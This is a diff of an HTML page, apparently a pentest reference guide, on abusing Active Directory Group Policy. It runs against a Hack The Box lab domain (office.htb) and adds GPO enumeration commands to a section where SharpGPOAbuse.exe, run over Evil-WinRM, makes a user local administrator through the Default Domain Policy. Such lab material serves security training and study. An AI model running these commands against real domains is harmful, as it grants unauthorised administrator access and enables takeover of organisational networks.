@@ -318,9 +318,19 @@ body.dark-mode #dynamicFormContainer button:hover {
     background: #424242;
 }
 </style>
-  <h3 id="abuse-1-add-local-admin">Abuse #1: Add local admin</h3>
-<h4 id="1-list-gpos-name">1. List GPOs Name</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Get-GPO -All | Select-Object DisplayName
+  <h3 id="general">General</h3>
+<h4 id="1-install-gpmc-optional">1. Install GPMC [Optional]</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Runas Administrator
+</span></span><span class="line"><span class="cl"><span class="go">Install-WindowsFeature GPMC
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">PS C:\Windows\system32&gt; Install-WindowsFeature GPMC
+</span></span></span><span class="line"><span class="cl"><span class="go">Install-WindowsFeature GPMC
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Success Restart Needed Exit Code      Feature Result                           
+</span></span></span><span class="line"><span class="cl"><span class="go">------- -------------- ---------      --------------                           
+</span></span></span><span class="line"><span class="cl"><span class="go">True    No             Success        {Group Policy Management}                
+</span></span></span></code></pre></div><h4 id="2-list-gpos-name">2. List GPOs Name</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> List all GPOs
+</span></span><span class="line"><span class="cl"><span class="go">Get-GPO -All | Select-Object DisplayName
 </span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\Users\HHogan\Documents&gt; Get-GPO -All | Select-Object DisplayName
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">DisplayName
@@ -333,8 +343,15 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span></span><span class="line"><span class="cl"><span class="go">Windows Update Domain Policy
 </span></span></span><span class="line"><span class="cl"><span class="go">Software Installation GPO
 </span></span></span><span class="line"><span class="cl"><span class="go">Password Policy GPO
-</span></span></span></code></pre></div><h4 id="2-add-localadmin">2. Add localAdmin</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\SharpGPOAbuse.exe --AddLocalADmin --UserAccount &#39;&lt;USER&gt;&#39; --GPOName &#39;&lt;GPO_NAME&gt;&#39;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Check GPO by name
+</span></span><span class="line"><span class="cl"><span class="go">Get-GPO -Name &#39;&lt;GPO_NAME&gt;&#39;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Generate XML report
+</span></span><span class="line"><span class="cl"><span class="go">Get-GPOReport -Name &#39;&lt;GPO_NAME&gt;&#39; -ReportType XML
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Generate pretty HTML report
+</span></span><span class="line"><span class="cl"><span class="go">Get-GPOReport -Name &#39;&lt;GPO_NAME&gt;&#39; -ReportType HTML -Path &#34;C:\ProgramData\GPOReport.html&#34;
+</span></span></span></code></pre></div><h3 id="abuse-1-add-local-admin">Abuse #1: Add local admin</h3>
+<h4 id="1-add-localadmin">1. Add localAdmin</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount &#39;&lt;USER&gt;&#39; --GPOName &#39;&lt;GPO_NAME&gt;&#39;
 </span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\Users\HHogan\Documents&gt; .\SharpGPOAbuse.exe --AddLocalADmin --UserAccount &#39;HHogan&#39; --GPOName &#39;Default Domain Policy&#39;
 </span></span></span><span class="line"><span class="cl"><span class="go">[+] Domain = office.htb
 </span></span></span><span class="line"><span class="cl"><span class="go">[+] Domain Controller = DC.office.htb
@@ -347,7 +364,7 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span></span><span class="line"><span class="cl"><span class="go">[+] The version number in GPT.ini was increased successfully.
 </span></span></span><span class="line"><span class="cl"><span class="go">[+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.
 </span></span></span><span class="line"><span class="cl"><span class="go">[+] Done!
-</span></span></span></code></pre></div><h4 id="3-force-reload">3. Force reload</h4>
+</span></span></span></code></pre></div><h4 id="2-force-reload">2. Force reload</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">gpupdate /force
 </span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\Users\HHogan\Documents&gt; gpupdate /force
 </span></span></span><span class="line"><span class="cl"><span class="go">Updating policy...
